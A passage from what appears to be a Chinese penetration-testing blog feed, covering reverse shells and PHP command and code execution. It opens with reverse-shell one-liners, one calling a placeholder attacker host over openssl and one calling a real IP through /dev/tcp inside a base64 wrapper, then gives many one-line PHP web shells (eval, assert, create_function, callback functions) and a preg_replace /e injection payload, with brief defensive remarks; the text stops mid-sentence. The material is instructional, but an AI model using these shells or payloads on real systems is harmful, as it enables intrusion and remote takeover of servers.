443</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211150148174.png" alt="image-20221115014824719"></p><ol start="3"><li>在目标机上反弹shell</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkfifo</span> /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;ATTACKER-IP&gt;:&lt;PORT&gt; &gt; /tmp/s; <span class="built_in">rm</span> /tmp/s</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211150148123.png" alt="image-20221115014848759"></p><h2 id="Java反弹shell常用"><a href="#Java反弹shell常用" class="headerlink" title="Java反弹shell常用"></a>Java反弹shell常用</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">bash -c &#123;<span class="built_in">echo</span>,X&#125;|&#123;<span class="built_in">base64</span>,-d&#125;|&#123;bash,-i&#125; </span><br><span class="line">其中X地方我们要换成我们需要执行的命令：</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/47.101.214.85/6666 0&gt;&amp;1</span><br><span class="line">还要将这个命令进行<span class="built_in">base64</span>编码，再塞进去</span><br></pre></td></tr></table></figure><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://www.cnblogs.com/old-path-white-cloud/p/11685558.html">linux mkfifo命令基本用法 - 故道丶白云 - 博客园 (cnblogs.com)</a></li><li></li></ul></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> WEB安全 </category>
          
          <category> 命令执行 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式</title>
      <link href="/%E7%9F%A5%E8%AF%86/Coder/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html"/>
      <url>/%E7%9F%A5%E8%AF%86/Coder/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><hr><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li>[PHP 正则表达式 (w3schools.cn)](<a href="https://www.w3schools.cn/php/php_regex.asp#:~:text=%E5%9C%A8">https://www.w3schools.cn/php/php_regex.asp#:~:text=在</a> PHP 中，正则表达式是由分隔符、模式和可选修饰符组成的字符串。 %24exp %3D “%2Fw3schools%2Fi”%3B 在上面的例子中， %2F,w3schools 是 模式 ，而 i 是一个 修饰符 ，它使搜索不区分大小写。)</li></ul></blockquote><blockquote><p><strong>声明：</strong></p><ol><li><p>若文章存在错误，望诸君不吝指正^</p></li><li><p>部分笔记由于年代久远，做的笔记找不到最初是引用谁的，若是不允许引用转载，请联系我</p></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
          <category> Coder </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>0x09 - Web安全基础-命令执行GetShell</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/0x09-Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CGetShell.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/0x09-Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CGetShell.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>命令执行</p><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="命令执行漏洞简介"><a href="#命令执行漏洞简介" class="headerlink" title="命令执行漏洞简介"></a>命令执行漏洞简介</h2><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>应用未对用户输入做严格得检查过滤，导致用户输入得参数被当成命令来执行。</p><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul><li>继承Web服务程序的权限去执行系统命令或读写文件</li><li>反弹shell，获得目标服务器的权限</li><li>进一步内网渗透</li></ul><h3 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h3><p>因为业务需求，在PHP中有时需要调用一些执行命令的函数，如： <code>eval() 、assert() 、 preg_replace() 、 create_function()</code> 等，如果存在一个使用这些函数且未对可被用户控制的参数进行检查过滤的页面，那么这个页面就可能存在远程代码执行漏洞。</p><h3 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h3><p>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上，一般会给用户提供一个<code>ping</code>操作的web界面，用户从web界面输入目标IP，提交后后台会对该IP地址进行一次<code>ping</code>测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交恶意命令，让后台进行执行，从而获得后台服务器权限。利用PHP 的系统命令执行函数来调用系统命令并执行，这类函数有 <code>system()、exec()、shell_exec()、passthru()、penti_exec()、popen()、proc_pen()</code>等，此外还有<code>反引号命令</code>执行，这种方式实际上是调用 <code>shell_exec()</code>函数来执行。</p><h2 id="PHP代码执行函数"><a href="#PHP代码执行函数" class="headerlink" title="PHP代码执行函数"></a>PHP代码执行函数</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval()"></a><code>eval()</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span> ( <span class="keyword">string</span> <span class="variable">$code</span> )</span><br></pre></td></tr></table></figure><blockquote><p>把字符串 <code>code</code> 变量作为PHP代码执行（在php中<code>$code</code>表示定义一个名叫<code>code</code>的变量）</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意：</p><ul><li><code>eval()</code> 函数传入的参数必须为<strong>PHP代码</strong>，即要以分号结尾；</li><li><code>@</code>在PHP中用作错误控制操作符。当表达式附加@符号时，将忽略该表达式可能生成的错误消息。</li><li>函数eval()语言结构是非常危险的， 因为它允许执行任意 PHP 代码。不要允许传入任何由用户提供的、未经完整验证过的数据 。</li></ul><h3 id="assert"><a href="#assert" class="headerlink" title="assert()"></a><code>assert()</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="keyword">string</span> <span class="variable">$description</span> ] )</span><br></pre></td></tr></table></figure><blockquote><p>如果 <code>assertion</code> 是字符串，它将会被 <code>assert()</code> 当做 PHP 代码来执行。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意：</p><p><code>assert()</code>函数是直接将传入的参数当成PHP代码执行，不需要以分号结尾（其实实际上操作的时候加不加；都可以执行)</p><h3 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a><code>preg_replace()</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span> ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] )</span><br><span class="line"><span class="comment">#preg_replace(&#x27;正则规则&#x27;,&#x27;替换字符&#x27;，&#x27;目标字符&#x27;)</span></span><br></pre></td></tr></table></figure><blockquote><p>执行一个正则表达式的搜索和替换，搜索 <code>subject</code> 中匹配 <code>pattern</code> 的部分， 以<code>replacement</code> 进行替换。</p></blockquote><p>实例1：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/test/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>],<span class="string">&quot;just test&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意1：</p><ul><li><code>pattern</code>   要搜索的模式。可以使一个字符串或字符串数组。可以使用一些<code>PCRE</code>修饰符。</li><li><code>PCRE</code>修饰符<code>/e</code> ：<code>preg_replace()</code>在进行了对替换字符串的后向引用替换之后, 将替换后的字符串作为<code>php</code>代码执行, 并使用执行结果替换原本的字符串。<code>/e</code>的作用还是蛮重要的，将 replacement 参数当作 PHP 代码，注意是执行完再替换。</li><li>新版本<code>/e</code>修饰符没有使用</li></ul><p>实例2：</p><blockquote><p><a href="https://blog.csdn.net/weixin_43749601/article/details/113417093">preg_replace() &#x2F;e代码执行漏洞_2021！的博客-CSDN博客</a></p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211141731622.png" alt="image-20221114173127302" style="zoom:33%;" /></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]))       <span class="comment">//GET获取data的值</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];        <span class="comment">//如果有获取到值，就将其赋给data变量</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(.*)/e&#x27;</span>, <span class="string">&#x27;strtoupper(&quot;\\1&quot;)&#x27;</span>,<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//要这样子传参：GET请求url后面加上?data=[php]&#123;$&#123;system(whoami)&#125;&#125;[/php]传递data参数。php代码才会从GET里面抓取到data变量 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意2：</p><ul><li><p>和前面一样 使用 <code>/e</code> 修正符使 <code>preg_replace()</code> 将 <code>replacement</code> 参数当作 PHP 代码执行</p></li><li><p>php函数：<code>strtoupper ( string $string ) : string</code>       将 <code>string</code> 中所有的字母字符转换为大写并返回。</p></li><li><p><code>preg_replace()</code> 函数在匹配到符号正则的字符串时，会将替换字符串（第二个参数）当做代码来执行，但是这里的第二个参数却固定为 <code>strtolower(“\1”)</code>’字符串。上面的命令执行，相当于 <code>eval(‘strtolower(“\1”);’)</code> 结果，当中的 <code>\1</code> 实际上就是 <code>\1</code> ，而 <code>\1</code> 在正则表达式中有自己的含义。</p></li></ul><blockquote><p>对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p><p>所以这里的 <code>\1</code> 实际上指定的是第一个子匹配项</p></blockquote><ul><li>正则表达式<code>(.*)</code>的解释：匹配所有</li></ul><blockquote><p><code>.</code>  是任意字符 可以匹配任何单个字符，<code>*</code> 匹配0或多个正好在它之前的那个字符。例如正则表达式。<code>*</code>意味着能够匹配任意数量的任何字符</p><p><code>.*</code>具有贪婪的性质，首先匹配到不能匹配为止，根据后面的正则表达式，会进行回溯。<code>.*？</code>则相反，一个匹配以后，就往下进行，所以不会进行回溯，具有最小匹配的性质。</p></blockquote><ul><li><p>单引号串和双引号串在PHP中的处理是不相同的。双引号串中的内容可以被解释而且替换，而单引号串中的内容总被认为是普通字符</p><p>但是！！双引号中的函数不会被执行和替换。</p></li><li><p><strong>防御：</strong>将 <code>strtoupper(&quot;\\1&quot;)</code> <code>修改为strtoupper(&#39;\\1&#39;)</code>,这样<code>&#39;$&#123;phpinfo()&#125;&#39;</code>就会被当做一个普通的字符串处理（单引号中的变量不会被处理）</p></li></ul><h3 id="array-map"><a href="#array-map" class="headerlink" title="array_map()"></a><code>array_map()</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_map</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> , <span class="keyword">array</span> <span class="variable">$array1</span> [, <span class="keyword">array</span> $... ] )</span><br></pre></td></tr></table></figure><blockquote><p>作用：为数组的每个元素应用回调函数，意思就是将array里面的每个成员都交给一个回调函数去执行！！</p></blockquote><p>注意：</p><ul><li><code>callable $callback</code>  回调函数</li><li><code>array_map()</code>：返回数组，是为 <code>array1</code> 每个元素应用<code>callback</code>函数之后的数组。</li><li><code>callback</code> 函数<u>形参的数量</u>和传给 <u><code>array_map()</code> 数组数量</u>，两者必须一样。</li><li><code>callback</code>函数一般设置为<code>func=assert</code>，<code>cmd=system(whoami)</code>。最终即<code>assert(system(whoami);)</code></li></ul><p>例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line"><span class="variable">$new_array</span>=<span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$new_array</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意：</p><ul><li><code>array_map()</code> 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211141744312.png" alt="image-20221114174438015" style="zoom: 33%;" /><h3 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a><code>create_function()</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span> ( <span class="keyword">string</span> <span class="variable">$args</span> , <span class="keyword">string</span> <span class="variable">$code</span> )</span><br></pre></td></tr></table></figure><blockquote><p>从传递的参数创建一个匿名函数，并为其返回唯一的名称。</p><p>通常这些参数将作为<strong>单引号</strong>分隔的字符串传递。</p><p>使用单引号的原因是为了保护变量名不被解析，否则，如果使用双引号，就需要转义变量名，例如$avar。</p></blockquote><p>例子：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$func</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="variable">$func</span>();</span><br><span class="line"><span class="comment">//创建匿名函数执行代码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211141753192.png" alt="image-20221114175331855" style="zoom:33%;" /><h3 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a><code>call_user_func</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> [, <span class="keyword">mixed</span> <span class="variable">$parameter</span> [, <span class="keyword">mixed</span> $... ]] )</span><br></pre></td></tr></table></figure><blockquote><p>第一个参数 <code>callback</code> 是被调用的回调函数，其余参数是回调函数的参数。把第一个参数作为回调函数调用</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&quot;assert&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="comment">//传入的参数作为assert函数的参数</span></span><br><span class="line"><span class="comment">//cmd=system(whoami)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a><code>call_user_func_array</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func_array</span> ( <span class="keyword">callable</span> <span class="variable">$callback</span> , <span class="keyword">array</span> <span class="variable">$param_arr</span> )</span><br></pre></td></tr></table></figure><blockquote><p>调用回调函数，并把一个数组参数作为回调函数的参数。</p><p>把第一个参数作为回调函数<code>callback</code>调用，把参数数组<code>param_arr</code>作为回调函数的的参数传入。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&quot;assert&quot;</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="comment">//将传入的参数作为数组的第一个值传递给assert函数</span></span><br><span class="line"><span class="comment">//cmd=system(whoami)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter"></a><code>array_filter</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_filter</span> ( <span class="keyword">array</span> <span class="variable">$array</span> [, <span class="keyword">callable</span> <span class="variable">$callback</span> [, <span class="keyword">int</span> <span class="variable">$flag</span> = <span class="number">0</span> ]] )</span><br></pre></td></tr></table></figure><blockquote><p>用回调函数过滤数组中的单元，依次将 <code>array</code> 数组中的每个值传递到 <code>callback</code> 函数。如果 <code>callback</code> 函数返回 true，则 <code>array</code> 数组的当前值会被包含在返回的结果数组中。数组的键名保留不变。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array1</span>=<span class="keyword">array</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$func</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="variable">$array1</span>,<span class="variable">$func</span>);</span><br><span class="line"><span class="comment">//用回调函数过滤数组中的元素：array_filter(数组,函数)</span></span><br><span class="line"><span class="comment">//?func=system</span></span><br><span class="line"><span class="comment">//cmd=whoami</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211141759389.png" alt="image-20221114175953052" style="zoom: 33%;" /><h3 id="双引号-种输出可变变量"><a href="#双引号-种输出可变变量" class="headerlink" title="双引号{}种输出可变变量"></a><code>双引号&#123;&#125;种输出可变变量</code></h3><blockquote><p>这个地方不是很理解，搞的不是很透彻，php这段语法里面的两个中括号不是很懂</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// echo &quot;phpinfo()&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$&#123;phpinfo()&#125;</span>&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>将执行<code>&#123;&#125;</code> 中的代码，将其转换为字符串，然后将该字符串用作变量名，通过<code>&#123;$变量名&#125;</code>这种方式调用该变量。再通过<code>echo</code>输出变量结果</p></blockquote><p>注意：</p><ul><li>对于<strong>可变变量</strong>使用大括号，比如：<code>&#123;$val&#125;</code>，这时候大括号就是告诉PHP，括起来的部分要当成变量处理</li></ul><blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"><span class="variable">$array</span>=<span class="keyword">array</span>(<span class="string">&#x27;www&#x27;</span>,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;phpernote&#x27;</span>,<span class="string">&#x27;com&#x27;</span>);    </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$array</span>[&#x27;name&#x27;]&quot;</span>;<span class="comment">//用此句会报语法错误    </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$array[&#x27;name&#x27;]&#125;</span>&quot;</span>;<span class="comment">//此句正常，大括号内的字符将作为变量来处理</span></span><br></pre></td></tr></table></figure></blockquote><h2 id="PHP系统命令执行函数"><a href="#PHP系统命令执行函数" class="headerlink" title="PHP系统命令执行函数"></a>PHP系统命令执行函数</h2><blockquote><p>学习此类函数的最直接的方法就是去查找官方php文档，<a href="https://www.php.net/manual/zh/index.php">PHP: PHP 手册 - Manual</a><br>然后再去搜索相应的需要知道的知识</p></blockquote><p>命令执行相关函数：</p><ul><li><code>system()</code>：执行外部程序，并且显示输出；</li><li><code>exec()</code>：执行一个外部程序</li><li><code>shell_exec()</code>：通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</li><li><code>passthru()</code>：执行unix系统命令并且显示原始输出</li><li><code>pcntl_exec()</code>：在当前进程空间执行指定程序</li><li><code>popen()</code>：打开进程文件指针</li><li><code>proc_open()</code>：执行一个命令，并且打开用来输入&#x2F;输出的文件指针。</li></ul><p>PHP提供4个专门的执行外部命令的函数：</p><ul><li><code>exec()</code> </li><li><code>system()</code> </li><li><code>passthru()</code> </li><li><code>shell_exec()</code></li></ul><h3 id="exec"><a href="#exec" class="headerlink" title="exec()"></a><code>exec()</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span> ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">array</span> &amp;<span class="variable">$output</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ]] )</span><br></pre></td></tr></table></figure><blockquote><p>执行一个外部程序，<code>exec()</code> 执行 <code>command</code> 参数所指定的命令。<code>exec</code>执行系统外部命令时不会输出结果，而是<strong>返回结果的最后一行</strong>。如果想得到结果，可以使用第二个参数，让其输出到指定的数组。此数组一个记录代表输出的一行。即如果输出结果有20行，则这个数组就有20条记录，所以如果需要反复输出调用不同系统外部命令的结果，最好在输出每一条系统外部命令结果时清空这个数组unset($output) ，以防混乱。第三个参数用来取得命令执行的状态码，通常执行成功都是返回0。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 输出运行中的 php/httpd 进程的创建者用户名</span></span><br><span class="line"><span class="comment">// （在可以执行 &quot;whoami&quot; 命令的系统上）</span></span><br><span class="line"><span class="comment">// echo exec(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="comment">// exec(&#x27;ls -la&#x27;, $return);</span></span><br><span class="line"><span class="comment">// var_dump($return);</span></span><br><span class="line"><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">@<span class="title function_ invoke__">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$return</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$return</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意：</p><ul><li><code>var_dump()</code> — 在php种用来打印变量的相关信息</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202211141847390.png" alt="image-20221114184703985" style="zoom:33%;" /><h3 id="system"><a href="#system" class="headerlink" title="system()"></a><code>system()</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span> ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ] )</span><br></pre></td></tr></table></figure><blockquote><p>函数执行 <code>command</code> 参数所指定的命令， 并且输出执行结果。<code>system</code>和<code>exec</code>的区别在于，<code>system</code>在执行系统外部命令时，直接将结果输出到浏览器，如果执行命令成功则返回true，否则返回false。第二个参数与<code>exec</code>第三个参数含义一样。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="comment">// 输出 shell 命令 &quot;ls&quot; 的返回结果</span></span><br><span class="line"><span class="comment">// 并且将输出的最后一样内容返回到 $last_line。</span></span><br><span class="line"><span class="comment">// 将命令的返回值保存到 $retval。</span></span><br><span class="line"><span class="variable">$last_line</span> = <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>, <span class="variable">$retval</span>);</span><br><span class="line"><span class="comment">// 打印更多信息</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&lt;hr /&gt;Last line of the output: &#x27;</span> . <span class="variable">$last_line</span> . <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;hr /&gt;Return value: &#x27;</span> . <span class="variable">$retval</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a><code>passthru()</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">passthru</span> ( <span class="keyword">string</span> <span class="variable">$command</span> [, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> ] )</span><br></pre></td></tr></table></figure><blockquote><ul><li>执行外部程序并且显示<strong>原始输出</strong>,同<code>exec()</code>函数类似，<code>passthru()</code> 函数 也是用来执行外部命令（<code>command</code>）的。。如果要获取一个命令未经任何处理的原始输出， 请使用 <code>passthru()</code> 函数。当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 <code>exec()</code> 或 <code>system()</code> 函数。</li><li>passthru与system的区别：passthru直接将结果输出到浏览器，不返回任何值，且其可以输出二进制，比如图像数据。第二个参数可选，是状态码。</li></ul></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$output</span> = <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;ls -la&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$output</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//c.runoob.com/compile/1/</span></span><br><span class="line">在线执行结果：</span><br><span class="line">total <span class="number">12</span></span><br><span class="line">drwx------  <span class="number">2</span> <span class="number">882978</span> <span class="number">882978</span> <span class="number">4096</span> Mar <span class="number">25</span> <span class="number">06</span>:<span class="number">11</span> .</span><br><span class="line">drwxr-xr-x <span class="number">11</span> root   root    <span class="number">220</span> Mar <span class="number">25</span> <span class="number">06</span>:<span class="number">11</span> ..</span><br><span class="line">-rw-r--r--  <span class="number">1</span> <span class="number">882978</span> <span class="number">882978</span>   <span class="number">40</span> Mar <span class="number">25</span> <span class="number">06</span>:<span class="number">11</span> run</span><br><span class="line">-rw-r--r--  <span class="number">1</span> <span class="number">882978</span> <span class="number">882978</span>   <span class="number">66</span> Mar <span class="number">25</span> <span class="number">06</span>:<span class="number">11</span> script.php</span><br><span class="line">&lt;pre&gt;&lt;/pre&gt;</span><br></pre></td></tr></table></figure><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec()"></a><code>shell_exec()</code></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">shell_exec</span> ( <span class="keyword">string</span> <span class="variable">$cmd</span> )</span><br></pre></td></tr></table></figure><blockquote><p>通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。本函数同执行操作符（&#96;&#96;）.</p><p>注意：当 PHP 运行在 安全模式 